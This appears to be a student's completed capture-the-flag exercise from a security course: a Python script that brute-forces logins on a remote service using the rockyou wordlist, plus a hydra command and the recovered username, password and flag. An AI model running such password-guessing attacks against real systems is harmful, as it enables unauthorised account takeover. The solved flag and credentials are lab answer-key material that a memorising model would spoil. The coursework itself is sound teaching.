"""
    If you know the IP address of the Briong server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.
    
"""

import socket

host = "129.2.94.135" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            the Briong server.
    """

    username = "mnthomp22"   # Hint: use OSINT
    password = ""


    f = file("rockyou.txt").read()
    for word in f.split():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("connecting to " + host + "\n")
        s.connect((host, port))
        data = s.recv(1024)
        print(data)     
        print("sending " + username + "\n")
        s.send(username + "\n")
        data = s.recv(1024)
        print(data)
        print("sending " + word + "\n")
        s.send(word + "\n")
        data = s.recv(1024)
        print(data)
        if "Fail" not in data:
            password = word
            break

    print("the password is " + password)
    
    """


    data = s.recv(1024)
    print(data)

    f = file("rockyou.txt").read()
    for word in f.split():
        print word
    """
    pass

if __name__ == '__main__':
    brute_force()

"""
    tried this but didn't send password for some reason
    hydra -l mnthomp22 -P ~/Desktop/rockyou.txt -s 1337 telnet://129.2.94.135

    eventually gained access by brute force with the script i wrote in this file
    username: mnthomp22
    password: blink182
    Good! Here's your flag: CMSC389R-{vu1n_sc4n_t0_pwn}
"""